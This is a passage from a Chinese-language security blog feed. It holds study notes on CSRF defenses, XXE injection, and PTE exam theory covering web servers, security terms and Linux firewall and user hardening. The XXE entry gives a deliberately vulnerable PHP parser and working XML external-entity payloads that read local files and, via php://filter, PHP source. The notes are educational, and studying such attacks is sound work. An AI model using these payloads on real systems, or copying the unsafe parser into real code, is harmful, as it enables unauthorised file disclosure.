class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.验证码</span><br><span class="line">验证码防御被认为是对抗CSRF最为简单有效的方法。</span><br><span class="line">CSRF在用户不知情的情况下完成对应的操作，而验证码强制用户与应用程序交互，才能完成最终操作，可有效防御CSRF。</span><br><span class="line">出于用户体验考虑，不会每一个操作都加入验证码，验证码只能作为辅助手段，不能作为主要的解决方案。</span><br><span class="line"></span><br><span class="line">2.referer check</span><br><span class="line">Referer check主要用于防止盗链，同理也可以用来检查请求是否来自合法的&quot;源&quot;。</span><br><span class="line">缺陷：服务器并非任何时候都可以取到referer。例如HTTPS跳转到HTTP。</span><br><span class="line"></span><br><span class="line">3.Anti CSRF Token</span><br><span class="line">CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。</span><br><span class="line">防御措施就是生成一个随机且不被随机猜测的参数，目前大多数防御采用token(不可猜测)</span><br><span class="line"></span><br><span class="line">4.Token泄露</span><br><span class="line">GET型token泄露：</span><br><span class="line">页面中包含&lt;img src&#x3D;&quot;xxx.com&quot;&#x2F;&gt;那么请求中的referer就会携带对应的GET Token</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSRF" scheme="http://yoursite.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://yoursite.com/2020/08/01/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/XXE漏洞/</id>
    <published>2020-08-01T10:15:54.000Z</published>
    <updated>2020-08-01T10:19:18.000Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1.XML</span><br><span class="line">XML被设计用来传输和存储数据。XML文档形成了一种树结构，从‘根部’开始，然后扩展到‘枝叶’。</span><br><span class="line">XML允许创作者定义自己的标签和自己的文档结构。</span><br><span class="line"></span><br><span class="line">XML示例：</span><br><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;love&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;jan&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;don&#39;t&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line"></span><br><span class="line">2.XML语法规则</span><br><span class="line">所有的xml元素都必须有一个关闭标签</span><br><span class="line">XML标签对大小写敏感</span><br><span class="line">XML必须正确嵌套</span><br><span class="line">XML属性值必须加引号</span><br><span class="line">实体引用</span><br><span class="line">在XML中，空格被保留</span><br><span class="line"></span><br><span class="line">3.XML元素介绍</span><br><span class="line">XML元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</span><br><span class="line">每个元素又可以有对应的属性。XML属性必须加引号</span><br><span class="line"></span><br><span class="line">4.XML DTD</span><br><span class="line">拥有正确语法的XML被称为‘形式良好’的XML。通过DTD验证的XML是’合法‘的XML。</span><br><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note(to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading(#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body(#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.DTD声明类型</span><br><span class="line">内部的DOCTYPE声明：&lt;!DOCTYPE root-element [element-declartions]&gt;</span><br><span class="line"></span><br><span class="line">外部文档声明：加入DTD位于XML源文件的外部，那么它应通过被封装在一个DOCTYPE定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">2.DTD数据类型</span><br><span class="line">PCDATA 的意思是被解析的字符数据.PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</span><br><span class="line"></span><br><span class="line">CDATA 的意思是字符数据。</span><br><span class="line">CDATA是不会被解析器解析的文本。这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</span><br><span class="line"></span><br><span class="line">3.DTD实体介绍</span><br><span class="line">实体是定义引用普通文本或特殊字符的快捷方式的变量。</span><br><span class="line">内部实体：&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">外部实体：&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;</span><br><span class="line"></span><br><span class="line">4.XML注入产生原理</span><br><span class="line">XXE漏洞全称是XML External Entity Injection即xml外部实体注入漏洞。</span><br><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</span><br><span class="line"></span><br><span class="line">XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</span><br></pre></td></tr></table></figure><h2 id="XXE漏洞代码简单编写"><a href="#XXE漏洞代码简单编写" class="headerlink" title="XXE漏洞代码简单编写"></a>XXE漏洞代码简单编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.file_get_content函数</span><br><span class="line">file_get_contents()函数把整个文件读入到一个字符串中。</span><br><span class="line">参数path是必需，规定要读取的文件。</span><br><span class="line"></span><br><span class="line">2.php:&#x2F;&#x2F;input函数</span><br><span class="line">php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。</span><br><span class="line">结合file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;)可以读取POST提交的数据。</span><br><span class="line">&lt;?php</span><br><span class="line">$str &#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3.simplexml_load_string函数</span><br><span class="line">php中的simplexml_load_string函数将xml格式字符串转换为相应的simpleXMLElement。</span><br><span class="line"></span><br><span class="line">4.XML注入回显</span><br><span class="line">在PHP中可以使用print_r()、echo输出想要输出的内容。</span><br><span class="line">示例完整存在XXE漏洞代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">读取本地文件payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0 encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE利用-任意文件读取"><a href="#XXE利用-任意文件读取" class="headerlink" title="XXE利用-任意文件读取"></a>XXE利用-任意文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.XXE漏洞代码</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">2.PHP中POC</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.txt</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file&#x2F;txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;conf.php</span><br><span class="line"></span><br><span class="line">3.读取本地txt</span><br><span class="line">payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;value&gt; &amp;xxe &lt;&#x2F;value&gt;</span><br><span class="line">通过Burpsuite截断HTTP请求，改为POST方法，将payload放在post的内容页面中，空行。</span><br><span class="line"></span><br><span class="line">4.读取PHP文件</span><br><span class="line">直接利用file协议读取PHP文件会出现错误，则需要使用base64编码来进行读取。</span><br><span class="line">将SYSTEM后的替换为SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;test.php&quot; 即可</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>PTE理论2</title>
    <link href="http://yoursite.com/2020/07/27/PTE%E7%90%86%E8%AE%BA2/"/>
    <id>http://yoursite.com/2020/07/27/PTE理论2/</id>
    <published>2020-07-27T03:20:48.000Z</published>
    <updated>2020-08-02T09:31:13.956Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="web安全基础知识"><a href="#web安全基础知识" class="headerlink" title="web安全基础知识"></a>web安全基础知识</h1><h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>web服务器，又称为HTTP服务器，响应来自浏览器的HTTP请求，并且发送网页响应内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IIS:微软提供的服务器软件，包括web、ftp、smtp等组件</span><br><span class="line">常见漏洞：IIS短文件名、IIS解析漏洞、IIS6.0远程代码执行</span><br><span class="line"></span><br><span class="line">Apache：开源网页服务器，世界使用排名第一的web服务器</span><br><span class="line">常见漏洞：apache解析漏洞、日志文件漏洞</span><br><span class="line"></span><br><span class="line">Nginx：高性能HTTP和反向代理服务器，也是IAMP&#x2F;POP3&#x2F;SMTP服务器</span><br><span class="line">常见漏洞：Nginx解析漏洞、整数溢出漏洞</span><br><span class="line"></span><br><span class="line">Tomcat：轻量级开源web应用服务器，开发和调试JSP程序首选</span><br><span class="line">常见漏洞：tomcat弱口令、tomcat远程代码执行、本地提权</span><br><span class="line"></span><br><span class="line">weblogic：基于JAVAEE架构的中间件，用于管理大型分布式web应用的java应用服务器</span><br><span class="line">常见漏洞：java反序列化、SSRF</span><br></pre></td></tr></table></figure><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>数据库是按照数据结构来组织、存储和管理数据的仓库</p><p>结构化查询语言：简称SQL，用于存取数据以及查询、更新和管理关系数据库系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库分类：Mysql、MSSQL、Access、Oracle、Sqlite</span><br><span class="line"></span><br><span class="line">数据库管理软件：Phpmyadmin、navicat</span><br></pre></td></tr></table></figure><h4 id="开发语言及常见框架cms"><a href="#开发语言及常见框架cms" class="headerlink" title="开发语言及常见框架cms"></a>开发语言及常见框架cms</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">开发框架:codelgniter、thinkPHP</span><br><span class="line">cms：phpcms、dedecms、qibocms</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line">cms：aspcms、动易cms、南方数据</span><br><span class="line"></span><br><span class="line">.NET</span><br><span class="line">cms：siteserver</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line">开发框架：struts2、Spring MVC</span><br><span class="line">cms：jeecms、大汉cms</span><br></pre></td></tr></table></figure><h4 id="web常见架构"><a href="#web常见架构" class="headerlink" title="web常见架构"></a>web常见架构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LAMP</span><br><span class="line">Linux+Apache+Mysql+PHP:适用于大型网站架构，稳定性高，如企业网站</span><br><span class="line"></span><br><span class="line">WAMP</span><br><span class="line">windows+Apache+Mysql+PHP：适用于中小型网站</span><br><span class="line"></span><br><span class="line">其他组合：</span><br><span class="line">PHP+IIS</span><br><span class="line">ASP+IIS</span><br><span class="line">.NET+IIS</span><br><span class="line">JSP+Tomcat</span><br></pre></td></tr></table></figure><h4 id="安全术语"><a href="#安全术语" class="headerlink" title="安全术语"></a>安全术语</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">后门：方便以后再次进入或控制系统</span><br><span class="line"></span><br><span class="line">webshell：以asp、php、jsp或cgi等网页文件形式存在的一种命令执行环境，是一种网页后门</span><br><span class="line"></span><br><span class="line">0day漏洞：官方还没有发现或者发现还没有开发出补丁的漏洞</span><br><span class="line"></span><br><span class="line">exploit：简称exp，漏洞利用</span><br><span class="line"></span><br><span class="line">提权：提升在服务器中的权限</span><br><span class="line"></span><br><span class="line">跳板：为了隐藏自己的地址，让别人无法查找到自己的位置</span><br><span class="line"></span><br><span class="line">拖库：网站被入侵后，窃取其数据库</span><br><span class="line"></span><br><span class="line">社会工程学：利用人性的弱点，达到自身的目的</span><br><span class="line"></span><br><span class="line">APT攻击：高级持续性威胁，利用先进的攻击手段对特定的目标进行长期持续性的网络攻击行为</span><br></pre></td></tr></table></figure><p>基于应用层的攻击手段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">弱口令攻击</span><br><span class="line">配置缺陷</span><br><span class="line">应用漏洞</span><br><span class="line">SQL&#x2F;XSS等</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>基于网络主机的攻击手段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DDOS攻击</span><br><span class="line">远程溢出攻击</span><br><span class="line">ARP欺骗攻击</span><br><span class="line">僵木蠕</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>攻击代码共享站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rapid7.com</span><br><span class="line">packetstormsecurity.com</span><br><span class="line">exploit-db.com</span><br><span class="line">securityfocus.com</span><br><span class="line">securityvulns.com</span><br></pre></td></tr></table></figure><h2 id="Linux操作系统安全"><a href="#Linux操作系统安全" class="headerlink" title="Linux操作系统安全"></a>Linux操作系统安全</h2><h4 id="Linux系统概述"><a href="#Linux系统概述" class="headerlink" title="Linux系统概述"></a>Linux系统概述</h4><p>安全原则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">纵深防御</span><br><span class="line">运用PDCA模型</span><br><span class="line">最小权限法则</span><br><span class="line">白名单机制</span><br><span class="line">避免通过隐藏来实现安全</span><br><span class="line">入侵检测</span><br><span class="line">不要信任基础设施</span><br><span class="line">不要信任服务</span><br><span class="line">交付时保持默认安全</span><br></pre></td></tr></table></figure><p>组织和管理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加强安全意识培训</span><br><span class="line">注意弱密码问题</span><br><span class="line">明令禁止使用破解软件</span><br><span class="line">组建合理的安全组织结构</span><br></pre></td></tr></table></figure><h4 id="Linux防火墙"><a href="#Linux防火墙" class="headerlink" title="Linux防火墙"></a>Linux防火墙</h4><h5 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h5><p>防火墙firewall支持ipv4与ipv6，并支持网桥，采用firewall-cmd或firewall-config(gui)来动态管理内核 netfilter的临时或永久的接口规则，并实时生效而无需重启服务。</p><p>zone</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">drop:丢弃所有包，不给回应</span><br><span class="line">block：拒绝所有外部发起的连接，允许内部的连接</span><br><span class="line">public：允许指定的进入连接</span><br><span class="line">dmz：允许受限制的进入连接</span><br><span class="line">work：允许受信任的计算机被限制的进入连接</span><br><span class="line">trusted：信任所有连接</span><br></pre></td></tr></table></figure><p>过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source:根据源地址过滤</span><br><span class="line">interface：根据网卡过滤</span><br><span class="line">service：根据服务名过滤</span><br><span class="line">port：根据端口过滤</span><br><span class="line">icmp-block：icmp报文过滤</span><br><span class="line">masquerade：ip地址伪装</span><br><span class="line">forward-port：端口转发</span><br><span class="line">rule：自定义规则</span><br><span class="line"></span><br><span class="line">其中过滤规则优先级为：</span><br><span class="line">1.source</span><br><span class="line">2.interface</span><br><span class="line">3.firewalld.conf</span><br></pre></td></tr></table></figure><p>查看规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看运行状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line"></span><br><span class="line">查看被激活的zone信息</span><br><span class="line">firewall-cmd --get-active-zones</span><br><span class="line"></span><br><span class="line">查看指定接口的zone信息</span><br><span class="line">firewall-cmd --get-zone-of-interface&#x3D;ens32</span><br><span class="line"></span><br><span class="line">查看指定级别的接口</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-interfaces</span><br><span class="line"></span><br><span class="line">查看指定级别的所有信息</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-all</span><br><span class="line"></span><br><span class="line">查看所有级别被允许的信息</span><br><span class="line">firewall-cmd --get-service</span><br><span class="line"></span><br><span class="line">查看重启后所有被永久放行的服务</span><br><span class="line">firewall-cmd --get-service --permanent</span><br></pre></td></tr></table></figure><p>管理规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">丢弃： firewall-cmd --panic-on</span><br><span class="line"></span><br><span class="line">取消丢弃: firewall-cmd --panic-off</span><br><span class="line"></span><br><span class="line">查看丢弃状态：firewall-cmd --query-panic</span><br><span class="line"></span><br><span class="line">更新规则，不重启服务：firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">更新规则，重启服务：firewall-cmd --complete-reload</span><br><span class="line"></span><br><span class="line">添加某接口到某信任等级，永久修改</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-interface&#x3D;eth0 --permanent</span><br><span class="line"></span><br><span class="line">设置public为默认的信任等级</span><br><span class="line">firewall-cmd --set-default-zone&#x3D;public</span><br></pre></td></tr></table></figure><p>管理端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出dmz级别的被允许的进入端口</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --list-ports</span><br><span class="line"></span><br><span class="line">允许TCP8080端口至dmz级别</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --add-port&#x3D;8080&#x2F;tcp</span><br></pre></td></tr></table></figure><h5 id="TCP-wrappers"><a href="#TCP-wrappers" class="headerlink" title="TCP wrappers"></a>TCP wrappers</h5><p>TCP wrappers是工作在传输层的安全工具，主要功能是控制谁能访问，常见程序有rpcbind、vsftpd、sshd、telnet等。</p><p>TCP wrappers的使用主要是依靠两个配置文件/etc/hosts.allow,/etc/hosts.deny，用于拒绝和接受具有TCPwrappers控制的程序。</p><p>工作原理</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802145131891.png" alt="image-20200802145131891"></p><p>Denyhosts配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure_log&#x3D;&#x2F;var&#x2F;log&#x2F;secure   &#x2F;&#x2F;日志存放位置</span><br><span class="line">hosts_deny&#x3D;&#x2F;etc&#x2F;hosts.deny   &#x2F;&#x2F;检测到爆破后，指定在哪个配置文件中添加相应地址并禁止</span><br><span class="line">block_service &#x3D;sshd          &#x2F;&#x2F;指定封禁来源IP的哪些服务</span><br><span class="line">deny_threshold_invalid&#x3D;5     &#x2F;&#x2F;对于&#x2F;etc&#x2F;passwd下不存在的用户名暴力尝试，指定发现多少次封禁</span><br><span class="line">deny_threshold_root&#x3D;1        &#x2F;&#x2F;对root的暴力破解，指定发现多少次封禁</span><br><span class="line">hostname_lookup&#x3D;yes          &#x2F;&#x2F;是否启用来源IP到域名的解析</span><br></pre></td></tr></table></figure><h4 id="Linux用户安全"><a href="#Linux用户安全" class="headerlink" title="Linux用户安全"></a>Linux用户安全</h4><p>Linux用户管理涉及的文件：用户账号文件/etc/passwd、用户密码文件/etc/shadow、用户组文件/etc/group。</p><p>/etc/passwd格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：密码：用户ID、组ID、用户全称、主目录、登录shell</span><br></pre></td></tr></table></figure><p>/etc/shadow格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：密码：上次修改密码时间：两次修改密码间隔的最小天数：两次修改密码间隔的最大天数：提前几天警告用户密码过期：密码过期几天禁用用户：过期时间：保留字段</span><br></pre></td></tr></table></figure><p>/etc/group用户组文件</p><p>/etc/skel：在Linux系统新创建一个用户时，系统会自动把/etc/skel目录下的所有内容复制到新用户的主目录”/home/用户名下”</p><p>超级用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程控制</span><br><span class="line">设备控制</span><br><span class="line">网络控制</span><br><span class="line">文件系统控制</span><br><span class="line">用户控制</span><br></pre></td></tr></table></figure><p>用户管理基本操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">增加用户：useradd</span><br><span class="line">为用户设置密码：passwd</span><br><span class="line">删除用户：userdel</span><br><span class="line">修改用户属性：usermod</span><br></pre></td></tr></table></figure><h5 id="用户密码管理"><a href="#用户密码管理" class="headerlink" title="用户密码管理"></a>用户密码管理</h5><p>设置密码复杂度authconfig，配置文件/etc/security/pwquality.conf</p><p>生成复杂密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keepass：图形界面</span><br><span class="line">openssl：openssl rand-base64 20</span><br><span class="line">pwgen：pwgen -c -n -y 12 1   </span><br><span class="line">-c至少一个大写字母</span><br><span class="line">-n至少一个数字</span><br><span 